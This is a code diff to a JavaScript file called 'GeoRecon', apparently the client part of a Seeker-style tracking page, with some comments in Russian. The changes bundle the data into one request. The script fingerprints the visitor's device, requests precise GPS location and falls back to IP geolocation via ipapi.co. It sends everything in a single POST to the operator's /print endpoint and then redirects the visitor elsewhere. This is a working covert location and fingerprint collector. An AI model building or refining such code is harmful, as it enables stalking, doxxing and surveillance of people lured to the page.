@@ -1,191 +1,164 @@
 /**
- * GeoRecon - Serious Geolocation & Device Collector
- * Direct port of Seeker's logic (Vanilla JS, no jQuery)
+ * GeoRecon - Single Request Collector
+ * Sends ALL data (Device + Location) in ONE POST to /print
  */
 
-var ptf, cc, ram, ver, str, os;
-var canvas, gl, debugInfo, ven, ren, brw;
-var ht, wd;
+var collectedData = {}; // Хранилище для всех данных
 
-/**
- * Collect device fingerprint
- */
 function information() {
-    ptf = navigator.platform;
-    cc = navigator.hardwareConcurrency;
-    ram = navigator.deviceMemory;
-    ver = navigator.userAgent;
-    str = ver;
-    os = ver;
+    // Собираем базовую инфу и сохраняем в объект
+    collectedData.Platform = navigator.platform || 'Not Available';
+    collectedData.Cores = navigator.hardwareConcurrency || 'Not Available';
+    collectedData.RAM = navigator.deviceMemory || 'Not Available';
 
-    // GPU Canvas
-    canvas = document.createElement('canvas');
+    var ver = navigator.userAgent;
 
-    // Cores
-    if (cc === undefined) { cc = 'Not Available'; }
-
-    // RAM
-    if (ram === undefined) { ram = 'Not Available'; }
-
-    // Browser Detection
+    // Browser detection
     if (ver.indexOf('Firefox') !== -1) {
-        str = str.substring(str.indexOf(' Firefox/') + 1);
-        str = str.split(' ');
-        brw = str[0];
+        collectedData.Browser = ver.substring(ver.indexOf(' Firefox/') + 1).split(' ')[0];
     } else if (ver.indexOf('Chrome') !== -1) {
-        str = str.substring(str.indexOf(' Chrome/') + 1);
-        str = str.split(' ');
-        brw = str[0];
+        collectedData.Browser = ver.substring(ver.indexOf(' Chrome/') + 1).split(' ')[0];
     } else if (ver.indexOf('Safari') !== -1) {
-        str = str.substring(str.indexOf(' Safari/') + 1);
-        str = str.split(' ');
-        brw = str[0];
+        collectedData.Browser = ver.substring(ver.indexOf(' Safari/') + 1).split(' ')[0];
     } else if (ver.indexOf('Edge') !== -1) {
-        str = str.substring(str.indexOf(' Edge/') + 1);
-        str = str.split(' ');
-        brw = str[0];
+        collectedData.Browser = ver.substring(ver.indexOf(' Edge/') + 1).split(' ')[0];
     } else {
-        brw = 'Not Available';
+        collectedData.Browser = 'Not Available';
     }
 
-    // GPU Detection
+    // GPU
+    var canvas = document.createElement('canvas');
     try {
-        gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    } catch (e) { gl = null; }
-
-    if (gl) {
-        debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-            ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-            ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            collectedData.Vendor = gl.getParameter(gl.VENDOR);
+            collectedData.Renderer = gl.getParameter(gl.RENDERER);
         }
-    }
-    if (ven === undefined) { ven = 'Not Available'; }
-    if (ren === undefined) { ren = 'Not Available'; }
+    } catch (e) {}
+    if (!collectedData.Vendor) collectedData.Vendor = 'Not Available';
+    if (!collectedData.Renderer) collectedData.Renderer = 'Not Available';
 
-    // Screen
-    ht = window.screen.height;
-    wd = window.screen.width;
+    // Screen & OS
+    collectedData.Width = window.screen.width;
+    collectedData.Height = window.screen.height;
 
-    // OS Parsing
-    os = os.substring(0, os.indexOf(')'));
-    os = os.split(';');
-    os = os[1];
-    if (os === undefined) { os = 'Not Available'; }
-    os = os.trim();
-
-    // Send Device Info to Server
-    fetch('/print', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            type: 'device_info',
-            Platform: ptf,
-            Browser: brw,
-            Cores: cc,
-            RAM: ram,
-            Vendor: ven,
-            Renderer: ren,
-            Height: ht,
-            Width: wd,
-            OS: os
-        })
-    }).catch(err => console.error('Info send error:', err));
+    var osStr = ver.substring(0, ver.indexOf(')'));
+    var osParts = osStr.split(';');
+    collectedData.OS = (osParts[1] ? osParts[1].trim() : 'Not Available');
 }
 
 /**
- * Main Geolocation Function
+ * Fallback: Get location by IP (when GPS fails)
  */
-function locate(callback, errCallback) {
-    if (!navigator.geolocation) {
-        errCallback({code: 0}, 'Geolocation not supported');
-        return;
-    }
+function getIpLocation() {
+    console.log('[GeoRecon] Native GPS failed, trying IP-based location...');
 
-    var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
-
-    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
-
-    function showError(error) {
-        var err_text;
-        var err_status = 'failed';
-
-        switch (error.code) {
-            case error.PERMISSION_DENIED:
-                err_text = 'User denied the request for Geolocation';
-                break;
-            case error.POSITION_UNAVAILABLE:
-                err_text = 'Location information is unavailable';
-                break;
-            case error.TIMEOUT:
-                err_text = 'The request to get user location timed out';
-                alert('Please set your location mode on high accuracy...');
-                break;
-            case error.UNKNOWN_ERROR:
-                err_text = 'An unknown error occurred';
-                break;
-            default:
-                err_text = 'Unknown error';
-        }
-
-        // Send Error to Server
-        fetch('/print', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                type: 'error',
-                Status: err_status,
-                Error: err_text
-            })
-        }).catch(e => console.error('Error send failed:', e));
-
-        errCallback(error, err_text);
-    }
-
-    function showPosition(position) {
-        var lat = position.coords.latitude;
-        lat = lat ? lat + ' deg' : 'Not Available';
-
-        var lon = position.coords.longitude;
-        lon = lon ? lon + ' deg' : 'Not Available';
-
-        var acc = position.coords.accuracy;
-        acc = acc ? acc + ' m' : 'Not Available';
-
-        var alt = position.coords.altitude;
-        alt = alt ? alt + ' m' : 'Not Available';
-
-        var dir = position.coords.heading;
-        dir = dir ? dir + ' deg' : 'Not Available';
-
-        var spd = position.coords.speed;
-        spd = spd ? spd + ' m/s' : 'Not Available';
-
-        var ok_status = 'success';
-
-        // Send Location to Server
-        fetch('/print', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                type: 'location',
-                Status: ok_status,
-                Latitude: lat,
-                Longitude: lon,
-                Accuracy: acc,
-                Altitude: alt,
-                Direction: dir,
-                Speed: spd
-            })
-        })
+    fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
-            if (data.redirect) {
-                window.location.href = data.redirect;
-            }
-        })
-        .catch(err => console.error('Location send error:', err));
+            if (data.error) throw new Error('IP API failed');
 
-        callback();
-    }
+            // Заполняем поля локации данными из IP
+            collectedData.Type = 'location';
+            collectedData.Status = 'success (IP fallback)';
+            collectedData.Latitude = (data.latitude || 0) + ' deg';
+            collectedData.Longitude = (data.longitude || 0) + ' deg';
+            collectedData.Accuracy = 'IP-based (approx)';
+            collectedData.Altitude = 'N/A';
+            collectedData.Direction = 'N/A';
+            collectedData.Speed = 'N/A';
+            collectedData.City = data.city;
+            collectedData.Region = data.region;
+            collectedData.Country = data.country_name;
+
+            // ОТПРАВЛЯЕМ ВСЁ ОДНИМ ЗАПРОСОМ
+            sendSingleRequest();
+        })
+        .catch(err => {
+            console.error('[GeoRecon] IP fallback failed:', err);
+            // Даже если фолбэк не сработал, отправляем хотя бы инфу об устройстве
+            collectedData.Type = 'partial';
+            collectedData.Status = 'location failed';
+            sendSingleRequest();
+        });
+}
+
+function locate(callback, errCallback) {
+    console.log('[GeoRecon] Requesting position...');
+
+    // Firefox-friendly settings
+    var optn = {
+        enableHighAccuracy: false,
+        timeout: 15000,
+        maximumAge: 0
+    };
+
+    navigator.geolocation.getCurrentPosition(
+        function(position) {
+            console.log('[GeoRecon] Position received!');
+
+            // Заполняем поля локации
+            collectedData.Type = 'location';
+            collectedData.Status = 'success';
+            collectedData.Latitude = position.coords.latitude + ' deg';
+            collectedData.Longitude = position.coords.longitude + ' deg';
+            collectedData.Accuracy = position.coords.accuracy + ' m';
+            collectedData.Altitude = position.coords.altitude ? position.coords.altitude + ' m' : 'N/A';
+            collectedData.Direction = position.coords.heading ? position.coords.heading + ' deg' : 'N/A';
+            collectedData.Speed = position.coords.speed ? position.coords.speed + ' m/s' : 'N/A';
+
+            // ОТПРАВЛЯЕМ ВСЁ ОДНИМ ЗАПРОСОМ
+            sendSingleRequest();
+            callback();
+        },
+        function(error) {
+            console.error('[GeoRecon] Geolocation error:', error.code, error.message);
+
+            // Если ошибка 2 (POSITION_UNAVAILABLE) — пробуем определить по IP
+            if (error.code === 2) {
+                getIpLocation();
+                return;
+            }
+
+            // Для других ошибок (отказ, таймаут) — отправляем что есть + статус ошибки
+            collectedData.Type = 'error';
+            collectedData.Status = 'failed';
+
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    collectedData.Error = 'User denied geolocation';
+                    break;
+                case error.TIMEOUT:
+                    collectedData.Error = 'Geolocation request timeout';
+                    break;
+                default:
+                    collectedData.Error = 'Unknown error';
+            }
+
+            sendSingleRequest();
+            errCallback(error, collectedData.Error);
+        },
+        optn
+    );
+}
+
+
+function sendSingleRequest() {
+    console.log('[GeoRecon] Sending combined data...');
+
+    fetch('/print', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(collectedData)
+    })
+    .then(r => r.json())
+    .then(data => {
+        console.log('[GeoRecon] Data sent successfully');
+        if (data.redirect) {
+            window.location.href = data.redirect;
+        }
+    })
+    .catch(err => {
+        console.error('[GeoRecon] Send error:', err);
+    });
 }
